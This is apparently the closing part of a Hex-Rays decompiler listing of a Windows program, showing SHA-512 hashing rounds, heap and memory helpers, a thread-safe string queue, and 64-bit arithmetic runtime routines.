    v112 = v101 & v102 ^ v101 & v106 ^ v102 & v106;
    v64 = (unsigned int)(HIDWORD(v112) + HIDWORD(v111)) < HIDWORD(v111);
    LODWORD(v110) = v64 + v112 + v111;
    v63 = (unsigned int)(HIDWORD(v110) + HIDWORD(v103) + HIDWORD(v100)) < HIDWORD(v100);
    LODWORD(v100) = v63 + v107 + v100;
    HIDWORD(v100) += HIDWORD(v110) + HIDWORD(v103);
    HIDWORD(v103) += HIDWORD(v112) + HIDWORD(v111) + HIDWORD(v110);
    v62 = HIDWORD(v112) + HIDWORD(v111) + v108 < v108;
    LODWORD(v103) = v62 + v110 + v107;
    HIDWORD(v112) = ((_DWORD)v100 << 14) | (HIDWORD(v100) >> 18);
    LODWORD(v112) = v100 >> 18;
    HIDWORD(v111) = HIDWORD(v112) ^ (((_DWORD)v100 << 18) | (HIDWORD(v100) >> 14));
    LODWORD(v111) = v112 ^ (v100 >> 14);
    HIDWORD(v112) = v100 >> 9;
    LODWORD(v112) = ((_DWORD)v100 << 23) | (HIDWORD(v100) >> 9);
    v111 ^= v112;
    v112 = v99 & v100;
    v110 = v99 & v100 ^ v105 & ~v100;
    v108 = HIDWORD(v111) + (HIDWORD(v99) & HIDWORD(v100) ^ HIDWORD(v105) & ~HIDWORD(v100));
    v61 = v108 < HIDWORD(v110);
    v107 = v61 + v111 + v110;
    HIDWORD(v111) = v108 + dword_4040DC[2 * i];
    v60 = HIDWORD(v111) < dword_4040DC[2 * i];
    LODWORD(v111) = v60 + v107 + dword_4040D8[2 * i];
    HIDWORD(v110) = HIDWORD(v111) + v21[2 * i + 45];
    v59 = HIDWORD(v110) < v21[2 * i + 45];
    LODWORD(v110) = v59 + v111 + v21[2 * i + 44];
    v108 = HIDWORD(v110) + HIDWORD(v104);
    v58 = (unsigned int)(HIDWORD(v110) + HIDWORD(v104)) < HIDWORD(v104);
    v107 = v58 + v110 + v104;
    HIDWORD(v112) = v103 >> 2;
    LODWORD(v112) = ((_DWORD)v103 << 30) | (HIDWORD(v103) >> 2);
    HIDWORD(v111) = HIDWORD(v112) ^ ((16 * v103) | (HIDWORD(v103) >> 28));
    LODWORD(v111) = v112 ^ (v103 >> 28);
    HIDWORD(v112) = v103 >> 7;
    LODWORD(v112) = ((_DWORD)v103 << 25) | (HIDWORD(v103) >> 7);
    v111 ^= v112;
    v112 = v102 & v106 ^ v102 & v103 ^ v106 & v103;
    v57 = (unsigned int)(HIDWORD(v112) + HIDWORD(v111)) < HIDWORD(v111);
    LODWORD(v110) = v57 + v112 + v111;
    v56 = (unsigned int)(HIDWORD(v110) + HIDWORD(v104) + HIDWORD(v101)) < HIDWORD(v101);
    LODWORD(v101) = v56 + v107 + v101;
    HIDWORD(v101) += HIDWORD(v110) + HIDWORD(v104);
    HIDWORD(v104) += HIDWORD(v112) + HIDWORD(v111) + HIDWORD(v110);
    v55 = HIDWORD(v112) + HIDWORD(v111) + v108 < v108;
    LODWORD(v104) = v55 + v110 + v107;
    HIDWORD(v112) = ((_DWORD)v101 << 14) | (HIDWORD(v101) >> 18);
    LODWORD(v112) = v101 >> 18;
    HIDWORD(v111) = HIDWORD(v112) ^ (((_DWORD)v101 << 18) | (HIDWORD(v101) >> 14));
    LODWORD(v111) = v112 ^ (v101 >> 14);
    HIDWORD(v112) = v101 >> 9;
    LODWORD(v112) = ((_DWORD)v101 << 23) | (HIDWORD(v101) >> 9);
    v111 ^= v112;
    v112 = v100 & v101;
    v110 = v100 & v101 ^ v99 & ~v101;
    v108 = HIDWORD(v111) + (HIDWORD(v100) & HIDWORD(v101) ^ HIDWORD(v99) & ~HIDWORD(v101));
    v54 = v108 < HIDWORD(v110);
    v107 = v54 + v111 + v110;
    HIDWORD(v111) = v108 + dword_4040E4[2 * i];
    v53 = HIDWORD(v111) < dword_4040E4[2 * i];
    LODWORD(v111) = v53 + v107 + dword_4040E0[2 * i];
    HIDWORD(v110) = HIDWORD(v111) + v21[2 * i + 47];
    v52 = HIDWORD(v110) < v21[2 * i + 47];
    LODWORD(v110) = v52 + v111 + v21[2 * i + 46];
    v108 = HIDWORD(v110) + HIDWORD(v105);
    v51 = (unsigned int)(HIDWORD(v110) + HIDWORD(v105)) < HIDWORD(v105);
    v107 = v51 + v110 + v105;
    HIDWORD(v112) = v104 >> 2;
    LODWORD(v112) = ((_DWORD)v104 << 30) | (HIDWORD(v104) >> 2);
    HIDWORD(v111) = HIDWORD(v112) ^ ((16 * v104) | (HIDWORD(v104) >> 28));
    LODWORD(v111) = v112 ^ (v104 >> 28);
    HIDWORD(v112) = v104 >> 7;
    LODWORD(v112) = ((_DWORD)v104 << 25) | (HIDWORD(v104) >> 7);
    v111 ^= v112;
    v112 = v106 & v103 ^ v106 & v104 ^ v103 & v104;
    HIDWORD(v110) = HIDWORD(v112) + HIDWORD(v111);
    v50 = (unsigned int)(HIDWORD(v112) + HIDWORD(v111)) < HIDWORD(v111);
    LODWORD(v110) = v50 + v112 + v111;
    HIDWORD(v111) = v108 + HIDWORD(v102);
    v49 = v108 + HIDWORD(v102) < HIDWORD(v102);
    LODWORD(v111) = v49 + v107 + v102;
    LODWORD(v102) = v111;
    HIDWORD(v102) += v108;
    HIDWORD(v105) = HIDWORD(v110) + v108;
    v48 = HIDWORD(v110) + v108 < v108;
    LODWORD(v105) = v48 + v110 + v107;
  }
  v12 = a1[1];
  v97 = *a1;
  v98 = v12;
  a1[1] = v12 + HIDWORD(v105);
  v47 = a1[1] < HIDWORD(v105);
  *a1 = v47 + v97 + v105;
  v13 = a1[3];
  v97 = a1[2];
  v98 = v13;
  a1[3] = v13 + HIDWORD(v104);
  v46 = a1[3] < HIDWORD(v104);
  a1[2] = v46 + v97 + v104;
  v14 = a1[5];
  v97 = a1[4];
  v98 = v14;
  a1[5] = v14 + HIDWORD(v103);
  v45 = a1[5] < HIDWORD(v103);
  a1[4] = v45 + v97 + v103;
  v15 = a1[7];
  v97 = a1[6];
  v98 = v15;
  a1[7] = v15 + HIDWORD(v106);
  v44 = a1[7] < HIDWORD(v106);
  a1[6] = v44 + v97 + v106;
  v16 = a1[9];
  v97 = a1[8];
  v98 = v16;
  a1[9] = v16 + HIDWORD(v102);
  v43 = a1[9] < HIDWORD(v102);
  a1[8] = v43 + v97 + v102;
  v17 = a1[11];
  v97 = a1[10];
  v98 = v17;
  a1[11] = v17 + HIDWORD(v101);
  v32 = a1[11] < HIDWORD(v101);
  a1[10] = v32 + v97 + v101;
  v18 = a1[13];
  v97 = a1[12];
  v98 = v18;
  a1[13] = v18 + HIDWORD(v100);
  v41 = a1[13] < HIDWORD(v100);
  a1[12] = v41 + v97 + v100;
  v19 = a1[15];
  v97 = a1[14];
  v98 = v19;
  a1[15] = v19 + HIDWORD(v99);
  v40 = a1[15] < HIDWORD(v99);
  result = v40 + v97 + v99;
  a1[14] = result;
  return result;
}
// 4040A8: using guessed type int SHA512_Constants_4040A8[];
// 4040AC: using guessed type int SHA512_Constants_4040AC[];
// 4040B0: using guessed type int SHA512_Constants_4040B0[];
// 4040B4: using guessed type int dword_4040B4[];
// 4040B8: using guessed type int SHA512_Constants_4040B8[];
// 4040BC: using guessed type int dword_4040BC[];
// 4040C0: using guessed type int SHA512_Constants_4040C0[];
// 4040C4: using guessed type int dword_4040C4[];
// 4040C8: using guessed type int dword_4040C8[];
// 4040CC: using guessed type int dword_4040CC[];
// 4040D0: using guessed type int dword_4040D0[];
// 4040D4: using guessed type int dword_4040D4[];
// 4040D8: using guessed type int dword_4040D8[];
// 4040DC: using guessed type int dword_4040DC[];
// 4040E0: using guessed type int dword_4040E0[];
// 4040E4: using guessed type int dword_4040E4[];

//----- (00412D60) --------------------------------------------------------
HANDLE sub_412D60()
{
  HANDLE result; // eax

  result = GetProcessHeap();
  hHeap = result;
  return result;
}

//----- (00412D70) --------------------------------------------------------
unsigned int __cdecl sub_412D70(int a1, char a2, unsigned int a3)
{
  unsigned int result; // eax
  unsigned int i; // [esp+0h] [ebp-4h]

  for ( i = 0; i < a3; ++i )
  {
    *(_BYTE *)(a1 + i) = a2;
    result = i + 1;
  }
  return result;
}

//----- (00412DA0) --------------------------------------------------------
unsigned int __cdecl sub_412DA0(int a1, int a2, unsigned int a3)
{
  unsigned int result; // eax
  unsigned int i; // [esp+4h] [ebp-4h]

  for ( i = 0; i < a3; ++i )
  {
    *(_BYTE *)(a1 + i) = *(_BYTE *)(a2 + i);
    result = i + 1;
  }
  return result;
}

//----- (00412DE0) --------------------------------------------------------
LPVOID __cdecl sub_412DE0(int a1)
{
  LPVOID v2; // [esp+0h] [ebp-4h]

  do
    v2 = HeapAlloc(hHeap, 8u, a1 + 64);
  while ( !v2 );
  return v2;
}

//----- (00412E10) --------------------------------------------------------
BOOL __cdecl sub_412E10(LPVOID lpMem)
{
  return HeapFree(hHeap, 0, lpMem);
}

//----- (00412E30) --------------------------------------------------------
void __cdecl sub_412E30(int a1, LONG lInitialCount)
{
  *(_DWORD *)(a1 + 32) = lInitialCount;
  *(_DWORD *)(a1 + 36) = sub_412DE0(4 * lInitialCount);
  *(_DWORD *)a1 = CreateSemaphoreA(0, lInitialCount, lInitialCount, 0);
  *(_DWORD *)(a1 + 4) = CreateSemaphoreA(0, 0, lInitialCount, 0);
  *(_DWORD *)(a1 + 40) = 0;
  *(_DWORD *)(a1 + 44) = 0;
  InitializeCriticalSection((LPCRITICAL_SECTION)(a1 + 8));
}

//----- (00412EB0) --------------------------------------------------------
int __cdecl sub_412EB0(int a1, int a2, _DWORD *a3)
{
  int v4; // [esp+0h] [ebp-4h]

  *a3 = 0;
  if ( WaitForSingleObject(*(HANDLE *)(a1 + 4), 0) )
  {
    if ( !a2 )
    {
      *a3 = -1;
      return 0;
    }
    WaitForSingleObject(*(HANDLE *)(a1 + 4), 0xFFFFFFFF);
  }
  EnterCriticalSection((LPCRITICAL_SECTION)(a1 + 8));
  v4 = *(_DWORD *)(*(_DWORD *)(a1 + 36) + 4 * *(_DWORD *)(a1 + 44));
  *(_DWORD *)(a1 + 44) = (*(_DWORD *)(a1 + 44) + 1) % *(_DWORD *)(a1 + 32);
  LeaveCriticalSection((LPCRITICAL_SECTION)(a1 + 8));
  ReleaseSemaphore(*(HANDLE *)a1, 1, 0);
  return v4;
}

//----- (00412F50) --------------------------------------------------------
int __cdecl sub_412F50(int a1, LPCWSTR lpString, int a3)
{
  int v4; // [esp+0h] [ebp-8h]
  LPVOID v5; // [esp+4h] [ebp-4h]

  if ( WaitForSingleObject(*(HANDLE *)a1, 0) )
  {
    if ( !a3 )
      return 0;
    WaitForSingleObject(*(HANDLE *)a1, 0xFFFFFFFF);
  }
  EnterCriticalSection((LPCRITICAL_SECTION)(a1 + 8));
  v5 = 0;
  if ( lpString )
  {
    v4 = 2 * lstrlenW(lpString) + 2;
    v5 = sub_412DE0(v4);
    sub_412DA0((int)v5, (int)lpString, v4);
  }
  *(_DWORD *)(*(_DWORD *)(a1 + 36) + 4 * *(_DWORD *)(a1 + 40)) = v5;
  *(_DWORD *)(a1 + 40) = (*(_DWORD *)(a1 + 40) + 1) % *(_DWORD *)(a1 + 32);
  LeaveCriticalSection((LPCRITICAL_SECTION)(a1 + 8));
  ReleaseSemaphore(*(HANDLE *)(a1 + 4), 1, 0);
  return 1;
}

//----- (00413040) --------------------------------------------------------
unsigned __int64 __stdcall sub_413040(__int64 a1, __int64 a2)
{
  if ( HIDWORD(a1) | HIDWORD(a2) )
    return a1 * a2;
  else
    return (unsigned int)a2 * (unsigned __int64)(unsigned int)a1;
}

//----- (00413080) --------------------------------------------------------
int __usercall sub_413080@<eax>(__int64 a1@<edx:eax>, unsigned __int8 a2@<cl>)
{
  __int64 v2; // rax

  if ( a2 >= 0x40u )
  {
    LODWORD(v2) = 0;
  }
  else if ( a2 >= 0x20u )
  {
    LODWORD(v2) = 0;
  }
  else
  {
    return a1 << (a2 & 0x1F);
  }
  return v2;
}

//----- (004130A0) --------------------------------------------------------
int __usercall sub_4130A0@<eax>(__int64 a1@<edx:eax>, unsigned __int8 a2@<cl>)
{
  if ( a2 >= 0x40u )
  {
    LODWORD(a1) = SHIDWORD(a1) >> 31;
  }
  else if ( a2 >= 0x20u )
  {
    LODWORD(a1) = SHIDWORD(a1) >> (a2 & 0x1F);
  }
  else
  {
    a1 >>= a2 & 0x1F;
  }
  return a1;
}

//----- (004130D0) --------------------------------------------------------
unsigned __int64 __usercall sub_4130D0@<edx:eax>(unsigned __int64 a1@<edx:eax>, unsigned __int8 a2@<cl>)
{
  if ( a2 >= 0x40u )
    return 0i64;
  else
    return a1 >> a2;
}

//----- (004130F0) --------------------------------------------------------
int __stdcall sub_4130F0(unsigned __int64 a1, __int64 a2)
{
  int v2; // edi
  int v3; // eax
  unsigned __int64 v4; // rtt
  __int64 v5; // rax
  unsigned __int64 v6; // rcx
  unsigned __int64 v7; // rax
  unsigned int v8; // esi
  unsigned __int64 v9; // rax

  v2 = 0;
  if ( (a1 & 0x8000000000000000ui64) != 0i64 )
  {
    v2 = 1;
    HIDWORD(a1) = -HIDWORD(a1) - ((_DWORD)a1 != 0);
    LODWORD(a1) = -(int)a1;
  }
  v3 = HIDWORD(a2);
  if ( a2 < 0 )
  {
    ++v2;
    v3 = -HIDWORD(a2) - ((_DWORD)a2 != 0);
    HIDWORD(a2) = v3;
    LODWORD(a2) = -(int)a2;
  }
  if ( v3 )
  {
    v6 = __PAIR64__(v3, a2);
    v7 = a1;
    do
    {
      v6 >>= 1;
      v7 >>= 1;
    }
    while ( HIDWORD(v6) );
    v8 = v7 / (unsigned int)v6;
    v9 = v8 * (unsigned __int64)(unsigned int)a2;
    if ( __CFADD__(HIDWORD(a2) * v8, HIDWORD(v9)) || (HIDWORD(v9) = (a2 * (unsigned __int64)v8) >> 32, v9 > a1) )
      --v8;
    v5 = v8;
  }
  else
  {
    LODWORD(v4) = a1;
    HIDWORD(v4) = HIDWORD(a1) % (unsigned int)a2;
    LODWORD(v5) = v4 / (unsigned int)a2;
    HIDWORD(v5) = HIDWORD(a1) / (unsigned int)a2;
  }
  if ( v2 == 1 )
    return -v5;
  return v5;
}

// nfuncs=82 queued=68 decompiled=68 lumina nreq=0 worse=0 better=0
// ALL OK, 68 function(s) have been successfully decompiled
